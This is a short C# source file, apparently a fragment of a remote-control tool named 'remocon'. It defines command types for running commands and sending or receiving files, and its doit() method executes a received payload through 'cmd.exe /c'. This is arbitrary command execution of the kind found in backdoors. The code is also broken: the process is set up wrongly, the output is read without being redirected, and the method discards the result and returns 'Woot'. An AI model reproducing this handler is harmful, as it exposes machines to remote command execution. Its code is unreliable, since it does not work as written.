using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace remocon
{
    class command
    {
        public enum command_type
        {
            COMMAND_RUN = 0x0,
            COMMAND_FILE_SEND = 0x1,
            COMMAND_FILE_RECV = 0x2
        }

        public command_type cmd;
        public int length;
        public byte[] payload;

        public string doit()
        {
            string returner = "";

            if (cmd == command_type.COMMAND_RUN)
            {
                string cmd = Encoding.ASCII.GetString(payload);
                ProcessStartInfo myprocinfo = new ProcessStartInfo("cmd.exe /c " + cmd);
                Process myproc = new Process();
                myproc.StartInfo = myprocinfo;
                myproc.Start();
                returner = myproc.StandardOutput.ReadToEnd();
            }

            return "Woot";

        }


    }
}
